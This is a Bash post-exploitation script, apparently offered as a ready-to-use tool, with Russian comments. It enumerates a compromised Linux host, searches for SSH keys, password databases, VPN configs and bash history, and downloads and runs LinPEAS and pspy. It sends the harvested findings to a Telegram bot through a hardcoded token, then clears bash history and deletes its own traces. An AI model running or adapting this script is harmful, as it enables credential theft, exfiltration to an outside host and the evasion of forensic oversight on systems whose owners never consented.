##############################################
#  credoeye privesc scanner                  #
#  Author:  FMCREDO                          #
#                                            #
#     Возможности:                           #
#  - Логирование в output.log                #
#  - Авто-загрузка и запуск LinPEAS & pspy   #
#  - Сжатый отчёт в Telegram                 #
#                                            #
#     Аргументы запуска:                     #
#  --quiet     – отключить вывод в консоль   #
#  --log       – сохранять лог в output.log  #
#  --light     – лёгкий режим (без LinPEAS   #
#                 и pspy)                    #
#  --full      – полный режим (по умолчанию) #
#                                            #
#    Отчёт Telegram:                         #
#  - Отправляется в TG чат в виде файла      #
#  - TG_BOT_TOKEN и TG_CHAT_ID указаны       #
#                                            #
#     Примеры запуска:                       #
#  ./post_exploit_pro.sh --quiet --log --light
#  ./post_exploit_pro.sh --log --full        #
##############################################


#!/bin/bash

TG_BOT_TOKEN="7774316859:AAEQ0jt5vqdyh-rwcpfTF9Htqx_8IKfGkNo"
TG_CHAT_ID="-1002471466975"
OUTPUT_FILE="output.log"
SEND_FILE="brief_report.txt"

MODE="full"
QUIET=false
LOG=false

while [[ "$#" -gt 0 ]]; do
    case $1 in
        --quiet) QUIET=true ;;
        --log) LOG=true ;;
        --light) MODE="light" ;;
        --full) MODE="full" ;;
    esac
    shift
done

log() {
    if ! $QUIET; then echo -e "$1"; fi
    if $LOG; then echo -e "$1" >> "$OUTPUT_FILE"; fi
}

run_command() {
    log "\n[+] $2"
    eval "$1" 2>/dev/null | tee -a "$OUTPUT_FILE" || log "[-] Ошибка или доступа нет."
}

> "$OUTPUT_FILE"

log "\n[*] Post Exploitation Quick Tips ($MODE Mode)\n"

run_command "whoami" "Пользователь:"
run_command "hostname" "Имя хоста:"
run_command "uname -a" "Инфо о системе:"

run_command "ls -la /home/*" "Список файлов в /home/"
run_command "cat ~/.bash_history" "История bash"
run_command "find / -name '*.kdbx' -o -name '*.ovpn' -o -name '*.pem'" "Поиск .kdbx, .ovpn, .pem"

run_command "find / -name id_rsa" "SSH-ключи"

run_command "cat /etc/crontab" "Cron-задания"

run_command "ss -tunlp" "Сетевые соединения"

if [[ "$MODE" == "full" ]]; then
    log "\n[+] Загружаем и запускаем LinPEAS:"
    wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh
    if [[ -f "linpeas.sh" ]]; then
        chmod +x linpeas.sh
        ./linpeas.sh | tee -a "$OUTPUT_FILE"
    else
        log "[-] Не удалось скачать linpeas.sh"
    fi
fi

# pspy (только в full)
if [[ "$MODE" == "full" ]]; then
    log "\n[+] Загружаем и запускаем pspy64:"
    wget -q https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -O pspy64
    if [[ -f "pspy64" ]]; then
        chmod +x pspy64
        timeout 60s ./pspy64 | tee -a "$OUTPUT_FILE"
    else
        log "[-] Не удалось скачать pspy64"
    fi
fi

grep -Ei "user|host|\.kdbx|\.ovpn|\.pem|id_rsa|/home|sshd|tunlp|cron|bash_history" "$OUTPUT_FILE" > "$SEND_FILE"

log "\n[+] Отправка отчёта в Telegram..."
curl -s -F document=@"$SEND_FILE" "https://api.telegram.org/bot$TG_BOT_TOKEN/sendDocument?chat_id=$TG_CHAT_ID" \
&& log "[+] Отчёт отправлен." \
|| log "[-] Не удалось отправить отчёт."

# Чистим лишнее
rm -f linpeas.sh pspy64

# Очистка истории и следов
log "\n[+] Зачищаем следы..."

# Удаление истории bash текущего пользователя
cat /dev/null > ~/.bash_history && history -c && log "[+] История bash очищена."

# Удаление логов и временных файлов
rm -f "$OUTPUT_FILE" "$SEND_FILE" linpeas.sh pspy64 && log "[+] Временные файлы удалены."

# (Опционально) Самоуничтожение скрипта
# rm -- "$0" && log "[+] Скрипт самоуничтожен."

log "\n[+] Завершено. Всё чисто 🧹"